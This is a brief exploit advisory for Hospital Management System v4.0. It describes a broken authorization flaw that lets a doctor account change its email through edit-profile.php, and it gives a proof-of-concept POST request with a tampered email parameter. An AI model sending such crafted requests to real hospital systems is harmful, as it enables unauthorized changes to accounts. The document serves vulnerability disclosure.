# Exploit Title: Hospital Management System v4.0 - Broken Object Property Level Authorization(BOPLA)
## Date: 1/4/2024
## Vendor Homepage: https://phpgurukul.com/hospital-management-system-in-php
## Tested on: Debian Linux, Apache, Mysql
## Vendor: PHPNews
## Version: v4.0
## Exploit Description:
## Hospital Management System v4.0 suffers from BOPLA - Broken Access Control Vulnerability allowing attacker doctor to update his email that cannot modify in UI.

## ---------------------------------POC-----------------------------
```
POST /hospital/hms/edit-profile.php HTTP/1.1
...

fname=user1&address=aaaaaa&city=abbb&gender=male&uemail=user2%40test.com(CHANGE HERE)&submit=
```